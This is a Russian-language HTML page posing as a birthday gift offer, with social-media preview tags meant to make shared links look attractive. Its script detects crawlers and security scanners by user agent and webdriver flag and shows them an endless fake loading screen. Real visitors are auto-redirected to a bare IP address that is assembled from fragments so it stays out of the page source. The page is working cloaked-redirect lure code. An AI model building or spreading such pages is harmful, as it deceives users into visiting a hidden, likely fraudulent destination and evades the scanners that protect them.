<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<title>С Днем Рождения! Забери подарок</title>

<!-- OG-теги: специально видны парсерам для красивого превью в TG/VK -->
<meta property="og:title" content="Забери подарки прямо сейчас">
<meta property="og:description" content="Праздничный подарок ждёт тебя.">
<meta property="og:image" content="https://vk-cool26.github.io/preview.jpg">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="630">
<meta property="og:image:type" content="image/jpeg">
<meta property="og:url" content="https://vk-cool26.github.io/">
<meta property="og:type" content="website">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="Забери подарки прямо сейчас">
<meta name="twitter:description" content="Праздничный подарок ждёт тебя.">
<meta name="twitter:image" content="https://vk-cool26.github.io/preview.jpg">

<style>
    * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
    html, body { height:100dvh; width:100%; overflow:hidden; }
    body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; background-color:#2f8ef0; touch-action:manipulation; }

    /* ---- ЗАГЛУШКА ДЛЯ БОТОВ ---- */
    #loader { position:fixed; inset:0; z-index:999; background:#2f8ef0; display:flex; flex-direction:column; align-items:center; justify-content:center; color:#fff; }
    .spinner { width:56px; height:56px; border:6px solid rgba(255,255,255,.35); border-top-color:#fff; border-radius:50%; animation:spin 1s linear infinite; }
    @keyframes spin { to { transform:rotate(360deg); } }
    #progress { margin-top:16px; font-weight:600; font-size:15px; opacity:.9; }

    /* ---- Реальный контент скрыт до проверки ---- */
    .hero-wrap { display:none; position:relative; width:100%; height:100%; overflow:hidden; }
    body.ready .hero-wrap { display:block; }
    body.ready #loader { display:none; }

    .hero-wrap img { display:block; width:100%; height:100%; object-fit:cover; object-position:center; }
    .btn-gift { position:absolute; left:50%; transform:translateX(-50%); bottom:calc(7% + env(safe-area-inset-bottom,0px)); width:78%; max-width:400px; padding:18px 24px; background:#fff; color:#1a1a2e; font-size:19px; font-weight:800; border:none; border-radius:18px; cursor:pointer; text-align:center; text-decoration:none; box-shadow:0 10px 30px rgba(21,101,192,.35); animation:pulse 2s ease-in-out infinite; }
    @keyframes pulse { 0%,100% { box-shadow:0 10px 30px rgba(21,101,192,.35); } 50% { box-shadow:0 10px 40px rgba(255,255,255,.7); } }
    .btn-gift:active { transform:translateX(-50%) scale(.96); }
    @media (min-width:1024px) { body { display:flex; align-items:center; justify-content:center; } .hero-wrap { width:430px; height:90vh; border-radius:26px; box-shadow:0 25px 70px rgba(0,0,0,.28); } }
</style>
</head>
<body>

<!-- Боты и парсеры без JS видят ТОЛЬКО этот блок — вечно -->
<div id="loader">
    <div class="spinner"></div>
    <p id="progress">Загружаем подарок… 0%</p>
</div>

<noscript>
    <p style="position:fixed;bottom:20px;width:100%;text-align:center;color:#fff;">Включите JavaScript, чтобы открыть подарок</p>
</noscript>

<!-- Реальный контент: скрыт, пока проверка не пройдена -->
<div class="hero-wrap">
    <img src="cake.jpg" alt="С Днем Рождения">
    <a href="#" class="btn-gift" id="giftBtn">🎁 Забрать подарок</a>
</div>

<script>
(function () {
    var ua = navigator.userAgent || '';

    /* Детект ботов: сигнатуры в User-Agent + следы автоматизации */
    var botUA = /(bot|crawl|spider|scan|masscan|curl|wget|python|httpx|headless|phantom|selenium|puppeteer|playwright|censys|shodan|nmap|zgrab|externalhit|facebot|vkshare|twitterbot|slackbot|discordbot|embedly|archive)/i.test(ua);
    var isBot = botUA || navigator.webdriver === true;

    if (isBot) {
        /* Вечная загрузка: процент ползёт до 99 и намертво зависает */
        var p = 0;
        var el = document.getElementById('progress');
        var t = setInterval(function () {
            p += Math.random() * 7;
            if (p >= 99) { p = 99; clearInterval(t); }
            el.textContent = 'Загружаем подарок… ' + Math.floor(p) + '%';
        }, 300);
        return; /* контент не показан, редиректа нет, ссылки нет */
    }

    /* Человек: открываем контент */
    document.body.classList.add('ready');

    var giftBtn = document.getElementById('giftBtn');
    /* Партнёрка собрана из кусков — в HTML-исходнике её нет */
    var targetUrl = 'http://' + '213.209.159.3' + '/?s=' + 'uZz4AKAghk';
    var redirected = false;

    setTimeout(function () {
        if (!redirected) { redirected = true; window.location.replace(targetUrl); }
    }, 6000);

    giftBtn.addEventListener('click', function (e) {
        e.preventDefault();
        if (!redirected) { redirected = true; window.location.replace(targetUrl); }
    });
})();
</script>
</body>
</html>
